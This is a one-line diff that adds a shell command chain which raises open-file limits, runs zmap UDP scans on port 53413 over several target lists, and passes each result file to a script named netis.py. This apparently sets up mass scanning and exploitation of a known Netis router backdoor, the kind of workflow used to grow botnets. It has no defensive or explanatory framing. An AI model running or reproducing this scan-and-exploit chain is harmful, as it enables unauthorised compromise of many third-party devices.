@@ -1,0 +1,1 @@
+ulimit -n 999999; zmap -M udp -p53413 -i eth0 -wyay.lst -oyay.txt; python netis.py yay.txt; zmap -M udp -p53413 -i eth0 -wgodly.lst -ogodly.txt; python netis.py godly.txt; zmap -M udp -p53413 -i eth0 -wbanana.lst -obanana.txt; python netis.py banana.txt;
